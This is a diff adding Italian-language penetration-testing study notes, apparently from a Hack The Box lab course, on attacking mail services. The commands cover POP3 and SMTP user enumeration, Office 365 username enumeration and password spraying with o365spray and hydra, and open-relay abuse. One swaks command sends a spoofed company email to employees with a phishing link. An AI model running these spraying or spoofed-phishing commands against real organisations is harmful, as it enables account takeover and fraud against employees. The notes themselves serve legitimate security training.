@@ -729,3 +729,70 @@ RCPT TO:john
 250 2.1.5 john... Recipient ok
 ```
 
+### USER command
+
+Possiamo anche usare POP3 per enumerare gli utenti, in base all'implementazione del servizion
+
+```
+j4k1dibe@htb[/htb]$ telnet 10.10.110.20 110
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
++OK POP3 Server ready
+
+USER julio
+
+-ERR
+
+
+USER john
+
++OK
+```
+
+### Automatizzare con smtp-user-enum
+
+https://github.com/pentestmonkey/smtp-user-enum
+
+COn questo script possiamo automatizzare il tutto. con la flag **-M** specifichiamo il metodo (Ad esempio RCPT TO), con -t il target IP, e on -D il dominio
+
+`j4k1dibe@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`
+
+## Cloud Enumeration
+
+COme detto prima i servizi cloud danno la loro implementazione. questi servizi hanno custom feature che possiamo abusare tipo per fare username enumeration.
+
+O365 Spray(https://github.com/0xZDH/o365spray) e' un tool per username enumeration e password spraying per Microsoft Office 365.
+
+### Validate e il target usa Office 365
+`j4k1dibe@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz`
+
+### Enumerate username
+`j4k1dibe@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`
+
+## Password Attacks
+Si possono fare password attack con hydra sia a POP3, SMTP e IMAP
+
+`j4k1dibe@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3` , password spray (pw: COmpany01!) pop3
+
+
+Molto spesso pero' i servizi in cloud hanno bloccato i tool tipo hydra percio' conviene usare tool fatti apposta tipo **o365spray, MailSniper** per Microsoft Office o **CredKing** per Gmail. I tool vanno aggiornati continuamente perhe' se il service provider cambia qualcosa i tool non funzionano piu'
+
+
+### Password spray con O365spray
+`j4k1dibe@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`
+
+
+### Open Relay
+Possiamo abusare l'attacco Open Relay mandando email phishing come un utente non eesistente o spoofando la mail di qualcun altro. 
+Per esempio, immaginiamo che stiamo attaccando un azienda con open relay mail server e identifichiamo che usano un indirizzo email spcifico per notificare i loro impiegati. Possiamo mandare una mail simile usando lo stesso indirizzo e aggiungere il nostro link di phishing con le informazioni.
+
+Con lo script nmap smtp-open-relay possiamo verificare se SMTP permette open relay
+
+`j4k1dibe@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213`
+
+
+Se lo permette possiamo usare qualsiasi mail client per connetterci al mail server e mandare le nostre email
+
+```j4k1dibe@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213```
